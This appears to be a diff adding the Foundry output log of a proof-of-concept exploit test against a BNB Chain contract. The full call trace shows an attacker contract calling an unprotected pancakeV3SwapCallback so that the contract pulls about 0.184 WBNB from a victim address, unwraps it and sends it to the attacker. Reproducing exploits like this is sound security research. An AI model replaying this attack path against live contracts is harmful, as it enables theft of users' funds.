@@ -1,0 +1,58 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/unverified_766a_exp.sol:ContractTest
+[PASS] testPoC() (gas: 562809)
+Logs:
+  before attack: balance of attacker: 0.000000000000003520
+  after attack: balance of attacker: 0.184162062600003519
+  after attack: balance of address(attC): 0.000000000000000001
+
+Traces:
+  [4310] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 42357807 [4.235e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::deal(0xbA35D089adDaC99A8e7BcD1a25712B1702623Ae3, 3520)
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [562809] ContractTest::testPoC()
+    ├─ emit log_named_decimal_uint(key: "before attack: balance of attacker", val: 3520, decimals: 18)
+    ├─ [0] VM::startPrank(0xbA35D089adDaC99A8e7BcD1a25712B1702623Ae3, 0xbA35D089adDaC99A8e7BcD1a25712B1702623Ae3)
+    │   └─ ← [Return]
+    ├─ [442478] → new AttackerC@0x8D4A30Fa8daD6E485d8cE3B587E65450C90961D9
+    │   └─ ← [Return] 2210 bytes of code
+    ├─ [64310] AttackerC::attack{value: 3520}()
+    │   ├─ [41475] 0x71cd31a564FF30ba61d7167a02Babc1484034E84::pancakeV3SwapCallback(-247659866327218868765 [-2.476e20], 184162062600000000 [1.841e17], 0x0000000000000000000000008d4a30fa8dad6e485d8ce3b587e65450c90961d9000000000000000000000000766a0936ff0ad045d39871846194edbd5df63a58)
+    │   │   ├─ [402] AttackerC::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
+    │   │   ├─ [35648] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transferFrom(0x766a0936FF0aD045d39871846194eDBd5DF63a58, AttackerC: [0x8D4A30Fa8daD6E485d8cE3B587E65450C90961D9], 184162062600000000 [1.841e17])
+    │   │   │   ├─ emit Transfer(from: 0x766a0936FF0aD045d39871846194eDBd5DF63a58, to: AttackerC: [0x8D4A30Fa8daD6E485d8cE3B587E65450C90961D9], value: 184162062600000000 [1.841e17])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x604ab3dbbfae674d19be491a5f71c87f0b091785d13bf80981b96ce1590ffeb4: 0x0000000000000000000000000000000000000000000000006a0a4b1a639e0100 → 0x000000000000000000000000000000000000000000000000677c04aed13daf00
+    │   │   │   │   @ 0x4be736cd423fef8f5d5eade6cd08f51140d24eaa0d52ef4471b657200d827133: 0x00000000000000000000000000000b7abc627050305adf1398f48bc9715e7900 → 0x00000000000000000000000000000b7abc627050305adf139666455ddefe2700
+    │   │   │   │   @ 0xc0e434f59ce64469bda643d18a59d453c85e44b844147267285daeddfe0a1e8a: 0 → 0x000000000000000000000000000000000000000000000000028e466b92605200
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(AttackerC: [0x8D4A30Fa8daD6E485d8cE3B587E65450C90961D9]) [staticcall]
+    │   │   └─ ← [Return] 184162062600000000 [1.841e17]
+    │   ├─ [9181] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(184162062599999999 [1.841e17])
+    │   │   ├─ [41] AttackerC::receive{value: 184162062599999999}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Withdrawal(src: AttackerC: [0x8D4A30Fa8daD6E485d8cE3B587E65450C90961D9], wad: 184162062599999999 [1.841e17])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc0e434f59ce64469bda643d18a59d453c85e44b844147267285daeddfe0a1e8a: 0x000000000000000000000000000000000000000000000000028e466b92605200 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ [0] 0xbA35D089adDaC99A8e7BcD1a25712B1702623Ae3::fallback{value: 184162062600003519}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of attacker", val: 184162062600003519 [1.841e17], decimals: 18)
+    ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(AttackerC: [0x8D4A30Fa8daD6E485d8cE3B587E65450C90961D9]) [staticcall]
+    │   └─ ← [Return] 1
+    ├─ emit log_named_decimal_uint(key: "after attack: balance of address(attC)", val: 1, decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.37s (1.51s CPU time)
+
+Ran 1 test suite in 3.85s (2.37s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
